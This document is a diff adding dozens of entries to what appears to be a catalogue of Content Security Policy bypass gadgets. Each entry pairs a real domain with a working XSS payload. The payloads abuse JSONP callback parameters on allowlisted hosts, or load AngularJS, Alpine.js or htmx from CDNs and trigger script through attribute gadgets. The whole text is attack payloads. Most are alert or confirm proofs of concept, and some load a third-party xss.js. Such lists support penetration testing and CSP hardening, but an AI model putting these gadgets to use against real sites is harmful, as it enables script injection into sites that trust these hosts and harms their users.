+    { domain: "ads.pictela.net", code: `<script src="http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json"></script>` },
+    { domain: "adserver.adtechus.com", code: `<script src="https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38"></script>` },
+    { domain: "ui.comet.aol.com", code: `<script src="https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487"></script>` },
+    { domain: "adtelligent.com", code: `<script src="https://adtelligent.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "portal.pf.aol.com", code: `<script src="http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053"></script>` },
+    { domain: "advangelists.com", code: `<script src="https://advangelists.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "api.m.sm.cn", code: `<script src="http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794"></script>` },
+    { domain: "advertising.com", code: `<script src="https://advertising.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "app-e.marketo.com", code: `<script src="http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>` },
+    { domain: "airbnb-api.arkoselabs.com", code: `<script src="https://airbnb-api.arkoselabs.com/fc/a/?callback=alert"></script></body>` },
+    { domain: "anchor.digitalocean.com", code: `<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>` },
+    { domain: "api-js.mixpanel.com", code: `<script src="https://api-js.mixpanel.com/engage/?callback=alert(1)"></script>` },
+    { domain: "api-v3.tinypass.com", code: `<script src="https://api-v3.tinypass.com/api/v3/conversion/logAutoMicroConversion?callback=alert"></script>` },
+    { domain: "api.bazaarvoice.com", code: `<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>` },
+    { domain: "api.bing.com", code: `<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>` },
+    { domain: "api.braintreegateway.com", code: `<script src="https://api.braintreegateway.com/merchants/x/client_api/v1/payment_methods/credit_cards?callback=alert"></script>` },
+    { domain: "api.chartbeat.com", code: `<script src="https://api.chartbeat.com/toppages/?jsonp=alert(1)-"></script>` },
+    { domain: "api.cxense.com", code: `<script src="https://api.cxense.com/profile/user/segment?callback=alert"></script>` },
+    { domain: "api.dailymotion.com", code: `<script src="https://api.dailymotion.com/video/x5gv6be?callback=alert()"></script>` },
+    { domain: "api.duckduckgo.com", code: `<script src="https://api.duckduckgo.com/?q=x&callback=alert&format=json"></script>` },
+    { domain: "api.flickr.com", code: `<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>` },
+    { domain: "api.forismatic.com", code: `<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert(1)"></script>` },
+    { domain: "api.getdrip.com", code: `<script src="https://api.getdrip.com/client/forms/show?callback=alert(1)-"></script>` },
+    { domain: "api.ipify.org", code: `<script src="https://api.ipify.org/?format=jsonp&callback=alert(1)//"></script>` },
+    { domain: "api.livechatinc.com", code: `<script src="https://api.livechatinc.com/v3.6/customer/action/get_dynamic_configuration?license_id=x&url=x&channel_type=code&jsonp=alert"></script>` },
+    { domain: "api.m.jd.com", code: `<script src="https://api.m.jd.com/api?appid=x&functionId=x&jsonp=alert(document.domain)//"></script>` },
+    { domain: "api.map.baidu.com", code: `<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>` },
+    { domain: "api.olark.com", code: `<script src="https://api.olark.com/2.0/visitors/z1nRAdDubyUjGyih018BZ0P04rBy00W3?_callback=alert&_method=PUT"></script>` },
+    { domain: "api.pinterest.com", code: `<script src="https://api.pinterest.com/v1/urls/count.json?callback=alert&url=x"></script>` },
+    { domain: "api.recurly.com", code: `<script src="https://api.recurly.com/js/v1/engage/settings?callback=alert(1)"></script>` },
+    { domain: "api.stackexchange.com", code: `<script src="https://api.stackexchange.com/2.2/me?callback=alert(1)-"></script>` },
+    { domain: "api.swiftype.com", code: `<script src="https://api.swiftype.com/api/v1/public/engines/search.json?callback=alert&engine_key=JDuYRnCLSDZzYWgBkoSB"></script>` },
+    { domain: "api.tumblr.com", code: `<script src="https://api.tumblr.com/v2/blog/zoeappleseed.tumblr.com/posts/photo?tag=seed&offset=0&api_key=msIByDvkVk3gSr360nq2vmTkKIAvW4gNTB2dUYkvIO9NLwyxNy&jsonp=alert"></script>` },
+    { domain: "api.usabilla.com", code: `<script src="https://api.usabilla.com/v2/feedback/c263014c1857.config?jsonp=alert"></script>` },
+    { domain: "api.wordpress.org", code: `<script src="https://api.wordpress.org/stats/plugin/1.0/?slug=x&callback=alert"></script>` },
+    { domain: "api.x.com", code: `<script src="https://api.x.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>` },
+    { domain: "apis.google.com", code: `<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>` },
+    { domain: "apis.google.com", code: `<script src="https://apis.google.com/js/googleapis.proxy.js?onload=alert"></script>` },
+    { domain: "apis.google.com", code: `<script src='https://apis.google.com/js/random%22-alert(document.domain)-%22//api.js?onload=random'></script>` },
+    { domain: "app-sjint.marketo.com", code: `<script src="https://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()"></script>` },
+    { domain: "app.hushly.com", code: `<script src="https://app.hushly.com/runtime/visitor?callback=alert(1)//"></script>` },
+    { domain: "app.link", code: `<script src="https://app.link/_r?sdk=web&callback=alert"></script>` },
+    { domain: "appointlet.com", code: `<script src="https://appointlet.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "apps.bdimg.com", code: `<body ng-app ng-csp><script src="https://apps.bdimg.com/libs/angular.js/1.4.6/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "assets.grubhub.com", code: `<body ng-app ng-csp><script src="https://assets.grubhub.com/libs/js/angular/1.8.3/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "assets.guim.co.uk", code: `<script src=https://assets.guim.co.uk/polyfill.io/v3/polyfill.min.js?callback=alert></script>` },
+    { domain: "assets.twitch.tv", code: `<script src="https://assets.twitch.tv/eppo/api/flag-config/v1/config?sdkName=js-sdk-client&sdkVersion=3.1.2&apiKey=3mv-BKCSZJDyZrwfqK86har6u13NgxRh.ZWg9bTRsZHJnLmUuZXBwby5jbG91ZCZjcz1tNGxkcmc&callback=alert()">` },
+    { domain: "avada.io", code: `<script src="https://avada.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "bildirt.com", code: `<script src="https://bildirt.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "boards.greenhouse.io", code: `<script src="https://boards.greenhouse.io/uncacheable_attributes/presigned_fields?callback=alert"></script>` },
+    { domain: "bookmark.hatenaapis.com", code: `<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>` },
+    { domain: "buy.tinypass.com", code: `<script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>` },
+    { domain: "c.y.qq.com", code: `<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>` },
+    { domain: "cas.criteo.com", code: `<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>` },
+    { domain: "cdn.arkoselabs.com", code: `<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>` },
+    { domain: "cdn.bootcdn.net", code: `<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "cdn.bootcss.com", code: `<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "cdn.jsdelivr.net", code: `<script src="https://cdn.jsdelivr.net/combine/gh/moment/moment@develop/min/moment.min.js,gh/renniepak/xss/xss.js"></script>` },
+    { domain: "cdn.jsdelivr.net", code: `<script src="https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js"></script>` },
+    { domain: "cdn.jsdelivr.net", code: `<script src="https://cdn.jsdelivr.net/npm/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">` },
+    { domain: "cdn.shopify.com", code: `<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/files/a.js"></script>` },
+    { domain: "cdn.staticfile.org", code: `<script src="https://cdn.staticfile.org/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "cdn.syncfusion.com", code: `<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "cdnjs.cloudflare.com", code: `<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">` },
+    { domain: "challenges.cloudflare.com", code: `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=alert"></script>` },
+    { domain: "client-api.arkoselabs.com", code: `<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>` },
+    { domain: "client.crisp.chat", code: `<script src="https://client.crisp.chat/settings/website/x/?callback=-alert(1)//"></script>` },
+    { domain: "clientauthconfig.clients6.google.com", code: `<script src="https://clientauthconfig.clients6.google.com/v1/clients?callback=alert(1)"></script>` },
+    { domain: "clients1.google.com", code: `<script src="https://clients1.google.com/complete/search?callback=alert&q=PIC&nolabels=t&client=youtube&ds=yt&_=1361575554883"></script>` },
+    { domain: "clients6.google.com", code: `<script src="https://clients6.google.com/drive/v2beta/files?callback=alert(1)"></script>` },
+    { domain: "cloudinary.com", code: `<script src="https://cloudinary.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "cloudusersettings-pa.clients6.google.com", code: `<script src="https://cloudusersettings-pa.clients6.google.com/v1alpha1/settings/CONSOLE_PINS/keys/CLOUD?callback=alert(1)"></script>` },
+    { domain: "code.angularjs.org", code: `<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "commerce.coinbase.com", code: `<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>` },
+    { domain: "common.like.naver.com", code: `<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>` },
+    { domain: "connect.mail.ru", code: `<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>` },
+    { domain: "connectad.io", code: `<script src="https://connectad.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "content.akamai.com", code: `<script src="https://content.akamai.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>` },
+    { domain: "content.googleapis.com", code: `<script src="https://content.googleapis.com/discovery/v1/apis?callback=alert(document.domain);var%20ignorethat="></script>` },
+    { domain: "count-server.sharethis.com", code: `<script src="https://count-server.sharethis.com/v2.0/get_counts?cb=alert"></script>` },
+    { domain: "ct.beslist.nl", code: `<script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>` },
+    { domain: "cubepile.com", code: `<script src="https://cubepile.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "d.adroll.com", code: `<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>` },
+    { domain: "d.la3-c2-ia5.salesforceliveagent.com", code: `<script src="https://d.la3-c2-ia5.salesforceliveagent.com/chat/rest/EmbeddedService/EmbeddedServiceConfig.jsonp?org_id=00D40000000MvPv&EmbeddedServiceConfig.configName=Support_Brandfolder_Chat_Agents&callback=alert&version=48"></script>` },
+    { domain: "d1xrp9zhb3ks3c.cloudfront.net", code: `<body ng-app ng-csp><script src="https://d1xrp9zhb3ks3c.cloudfront.net/web/changessalon/node_modules/angular/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "dable.io", code: `<script src="https://dable.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "dblp.org", code: `<script src="https://dblp.org/search/venue/api?q=&h=1000&c=0&rd=1a&format=jsonp&callback=alert"></script>` },
+    { domain: "demandbase.com", code: `<script src="https://demandbase.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "demo.matomo.cloud", code: `<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>` },
+    { domain: "dev.virtualearth.net", code: `<script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>` },
+    { domain: "dit.whatsapp.net", code: `<script src="https://dit.whatsapp.net/deidentified_telemetry?callback=alert"></script>` },
+    { domain: "documentation-resources.opendatasoft.com", code: `<script src="https://documentation-resources.opendatasoft.com/api/datasets/1.0/doc-geonames-cities-5000/?format=jsonp&callback=confirm(1);"></script>` },
+    { domain: "dpm.demdex.net", code: `<script src="https://dpm.demdex.net/id?d_cb=alert"></script>` },
+    { domain: "dreamwater.com.tr", code: `<script src="https://dreamwater.com.tr/wp-json?_jsonp=alert"></script>` },
+    { domain: "drivefrontend-pa.clients6.google.com", code: `<script src="https://drivefrontend-pa.clients6.google.com/v1/changes:getLargestChangeId?callback=alert(1)"></script>` },
+    { domain: "dynamic.criteo.com", code: `<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>` },
+    { domain: "e.cquotient.com", code: `<script src="https://e.cquotient.com/recs/bflp-Wells/cart_recomender?callback=alert"></script>` },
+    { domain: "elysiumwebsite.s3.amazonaws.com", code: `<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "eu.battle.net", code: `<script src="https://eu.battle.net/support/update/json?callback=alert"></script>` },
+    { domain: "fast.wistia.com", code: `<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>` },
+    { domain: "foremedia.net", code: `<script src="https://foremedia.net/wp-json?_jsonp=alert"></script>` },
+    { domain: "forms.hsforms.com", code: `<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>` },
+    { domain: "forms.hubspot.com", code: `<script src="https://forms.hubspot.com/embed/v3/form/2059467/2e1a1b5b-27bb-447d-aac4-0b87c1e88fec?callback=alert"></script>` },
+    { domain: "g2.gumgum.com", code: `<script src="https://g2.gumgum.com/hbid/imp?jsonp=alert(1)"></script>` },
+    { domain: "geolocation.onetrust.com", code: `<script src="https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location/alert"></script>` },
+    { domain: "gist.github.com", code: `<script src="https://gist.github.com/renniepak/e7afcd7e727e1a0c481d955ba10441a9.json?callback=alert"></script>` },
+    { domain: "global.apis.naver.com", code: `<script src="https://global.apis.naver.com/commentBox/cbox/web_neo_list_jsonp.json?_callback=alert"></script>` },
+    { domain: "go.dev", code: `<script src="https://go.dev/blog/.json?jsonp=alert"></script>` },
+    { domain: "go.recordedfuture.com", code: `<script src="https://go.recordedfuture.com/index.php/form/getForm?munchkinId=x&form=1&callback=alert"></script>` },
+    { domain: "go.snyk.io", code: `<script src="https://go.snyk.io/index.php/form/getForm?munchkinId=677-THP-415&form=1461&callback=alert"></script>` },
+    { domain: "google.com", code: `<script src="https://google.com/complete/search?client=chrome&jsonp=alert(1)"></script>` },
+    { domain: "graph.instagram.com", code: `<script src=https://graph.instagram.com/logging_client_events?callback=alert></script>` },
+    { domain: "graph.whatsapp.net", code: `<script src="https://graph.whatsapp.net/wa_qpl_data?callback=alert"></script>` },
+    { domain: "gravatar.com", code: `<script src="https://gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>` },
+    { domain: "gstatic.com", code: `<body ng-app ng-csp><script src="//gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "gstatic.com", code: `<script src='https://gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='\$event.target.ownerDocument.defaultView.alert(1)'>` },
+    { domain: "gum.criteo.com", code: `<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"></script>` },
+    { domain: "hcaptcha.com", code: `<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>` },
+    { domain: "help.afterpay.com", code: `<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>` },
+    { domain: "i.ytimg.com", code: `<body ng-app ng-csp><script src="https://i.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "iam.clients6.google.com", code: `<script src="https://iam.clients6.google.com/v1/projects/gen-lang-client-1/serviceAccounts?callback=alert(1)"></script>` },
+    { domain: "id.cxense.com", code: `<script src=https://id.cxense.com/public/user/id?callback=alert></script>` },
+    { domain: "identitytoolkit.googleapis.com", code: `<script src="https://identitytoolkit.googleapis.com/v1/projects?callback=alert(1)"></script>` },
+    { domain: "improvedigital.com", code: `<script src="https://improvedigital.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "info.cloudflare.com", code: `<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>` },
+    { domain: "info.elastic.co", code: `<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>` },
+    { domain: "inno.blob.core.windows.net", code: `<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "investor.coinbase.com", code: `<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>` },
+    { domain: "ipinfo.io", code: `<script src="https://ipinfo.io/?format=jsonp&callback=alert"></script>` },
+    { domain: "itunes.apple.com", code: `<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>` },
+    { domain: "jewelbetting.co", code: `<script src="https://jewelbetting.co/wp-json?_jsonp=alert"></script>` },
+    { domain: "jquery.com", code: `<script src="https://jquery.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "js.hcaptcha.com", code: `<script src="https://js.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>` },
+    { domain: "jsconfig.adsafeprotected.com", code: `<script src=https://jsconfig.adsafeprotected.com/jsconfig/rjss/st/1/1/skeleton.js?cbName=x;var%20__IASScope;alert(1)></script>` },
+    { domain: "kampyle.com", code: `<script src="https://kampyle.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "kbcprod.service-now.com", code: `<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "kck3hlb9.dashlane.com", code: `<script src="https://kck3hlb9.dashlane.com/1/installerlog/create?callback=alert"></script>` },
+    { domain: "kendo.cdn.telerik.com", code: `<body ng-app ng-csp><script src="https://kendo.cdn.telerik.com/2015.2.805/js/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "lghnh-mkt-prod1.campaign.adobe.com", code: `<script src="https://lghnh-mkt-prod1.campaign.adobe.com/lgh/at_seg_list.jssp?callback=alert(1)-"></script>` },
+    { domain: "libsyn.com", code: `<script src="https://libsyn.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "links.services.disqus.com", code: `<script src="https://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>` },
+    { domain: "locate.pricespider.com", code: `<script src="https://locate.pricespider.com/?callback=alert(1)"></script>` },
+    { domain: "lptag.liveperson.net", code: `<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>` },
+    { domain: "m.media-amazon.com", code: `<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "makroo.com", code: `<script src="https://makroo.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "maps-api-ssl.google.com", code: `<script src="https://maps-api-ssl.google.com/maps/api/js?callback=alert(1337)"></script>` },
+    { domain: "maps.google.com", code: `<script src="https://maps.google.com/maps/api/js?sensor=false&callback=alert(1)"></script>` },
+    { domain: "maps.google.de", code: `<script src="https://maps.google.de/maps/api/js?sensor=false&callback=alert(1)"></script>` },
+    { domain: "maps.google.lv", code: `<script src="https://maps.google.lv/maps/api/js?sensor=false&callback=alert(1)"></script>` },
+    { domain: "maps.google.ru", code: `<script src="https://maps.google.ru/maps/api/js?sensor=false&callback=alert(1)"></script>` },
+    { domain: "mc.yandex.ru", code: `<script src="https://mc.yandex.ru/watch/9528925/1?wmode=5&callback=alert"></script>` },
+    { domain: "monitoring.clients6.google.com", code: `<script src="https://monitoring.clients6.google.com/v3/projects/gen-lang-client-1/groups?callback=alert(1)"></script>` },
+    { domain: "mouseflow.com", code: `<script src="https://mouseflow.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "mts1.googleapis.com", code: `<script src="https://mts1.googleapis.com/mapslt/ft?hl=en&lyrs=ft&x=1&y=1&z=1&src=apiv3&callback=alert(1)"></script>` },
+    { domain: "njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com", code: `<script src="https://njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com/json?callback=alert(1)"></script>` },
+    { domain: "nominatim.openstreetmap.org", code: `<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>` },
+    { domain: "oamssoqae.ieee.org", code: `<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>` },
+    { domain: "okaccedo.com", code: `<script src="https://okaccedo.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "okt.hackthebox.com", code: `<script src="https://okt.hackthebox.com/ping?callback=alert(1)"></script>` },
+    { domain: "omtr2.partners.salesforce.com", code: `<script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>` },
+    { domain: "openexchangerates.org", code: `<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>` },
+    { domain: "openx.com", code: `<script src="https://openx.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "page.gitlab.com", code: `<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>` },
+    { domain: "pages.nist.gov", code: `<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "partner.googleadservices.com", code: `<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>` },
+    { domain: "passport.baidu.com", code: `<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>` },
+    { domain: "polyfill-fastly.io", code: `<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>` },
+    { domain: "polyfill.alicdn.com", code: `<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>` },
+    { domain: "preply.com", code: `<script src="https://preply.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "pubads.g.doubleclick.net", code: `<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>` },
+    { domain: "public-api.wordpress.com", code: `<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>` },
+    { domain: "publish.twitter.com", code: `<script src="https://publish.twitter.com/oembed?url=https://twitter.com/jack/status/20&callback=alert"></script>` },
+    { domain: "pubmatic.com", code: `<script src="https://pubmatic.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>` },
+    { domain: "query.fqtag.com", code: `<script src="https://query.fqtag.com/b?callback=alert(1)"></script>` },
+    { domain: "r.skimresources.com", code: `<script src="https://r.skimresources.com/api/?callback=alert"></script>` },
+    { domain: "raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com", code: `<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>` },
+    { domain: "recaptcha.net", code: `<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>` },
+    { domain: "recs.algorecs.com", code: `<script src="https://recs.algorecs.com/rrserver/api/engage/targeting?callback=alert(1)"></script>` },
+    { domain: "recs.richrelevance.com", code: `<script src="https://recs.richrelevance.com/rrserver/api/personalize?callback=alert(1)"></script>` },
+    { domain: "reklamstore.com", code: `<script src="https://reklamstore.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "rentokil-domains.firebaseio.com", code: `<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>` },
+    { domain: "resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net", code: `<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "resultsmedia.com", code: `<script src="https://resultsmedia.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "ring.com", code: `<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>` },
+    { domain: "romania.amazon.com", code: `<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=\$event.composedPath()|orderBy:'(z=alert)(1)'></body>` },
+    { domain: "rtb0.doubleverify.com", code: `<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>` },
+    { domain: "s.fqtag.com", code: `<script src="https://s.fqtag.com/b?callback=alert(1)"></script>` },
+    { domain: "s.yimg.jp", code: `<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "s.ytimg.com", code: `<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "sanalofisonline.com", code: `<script src="https://sanalofisonline.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "search.yahoo.com", code: `<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>` },
